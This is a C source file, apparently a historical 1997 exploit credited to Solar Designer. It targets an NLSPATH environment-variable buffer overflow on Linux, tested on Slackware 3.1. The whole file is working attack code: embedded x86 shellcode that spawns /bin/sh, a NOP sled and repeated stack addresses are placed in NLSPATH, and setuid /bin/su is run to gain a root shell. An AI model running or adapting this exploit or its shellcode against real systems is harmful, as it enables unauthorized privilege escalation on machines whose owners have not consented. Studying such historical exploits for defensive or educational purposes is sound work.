/*
 * NLSPATH buffer overflow exploit for Linux, tested on Slackware 3.1
 * Copyright (c) 1997 by Solar Designer
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shellcode =
  "\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80\x68\x59\x58\xff\xe1"
  "\xff\xd4\x31\xc0\x99\x89\xcf\xb0\x2e\x40\xae\x75\xfd\x89\x39\x89\x51\x04"
  "\x89\xfb\x40\xae\x75\xfd\x88\x57\xff\xb0\x0b\xcd\x80\x31\xc0\x40\x31\xdb"
  "\xcd\x80/"
  "/bin/sh"
  "0";

char *get_sp() {
   asm("movl %esp,%eax");
}

#define bufsize 2048
char buffer[bufsize];

main() {
  int i;

  for (i = 0; i < bufsize - 4; i += 4)
    *(char **)&buffer[i] = get_sp() - 3072;

  memset(buffer, 0x90, 512);
  memcpy(&buffer[512], shellcode, strlen(shellcode));

  buffer[bufsize - 1] = 0;

  setenv("NLSPATH", buffer, 1);

  execl("/bin/su", "/bin/su", NULL);
}
